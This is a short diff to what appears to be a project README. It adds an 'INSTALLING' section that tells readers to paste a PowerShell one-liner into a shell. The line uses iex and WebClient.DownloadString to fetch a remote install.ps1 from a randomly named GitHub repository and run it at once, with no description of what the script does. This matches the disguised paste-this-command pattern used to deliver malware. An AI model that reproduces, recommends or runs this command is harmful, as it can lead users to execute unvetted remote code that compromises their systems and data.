@@ -21,6 +21,17 @@
     _____________________________________________________________________________________________
     <br><br><br><br>
 <div class=badges align="center">
+   <img src="INSTALLING" width="60%"/>
+   <br><br><br><br>
+
+ Run this in Pwsh
+```
+iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/Regling/glowing-octo-parakeet/main/install.ps1'))
+```
+<div class=badges align="center">
+    _____________________________________________________________________________________________
+    <br><br><br><br>
+<div class=badges align="center">
    <img src="https://github.com/user-attachments/assets/7de44e8f-9d4e-4f46-a0d3-4b6f604d6ff9" width="60%"/>
    <br><br><br><br>
     
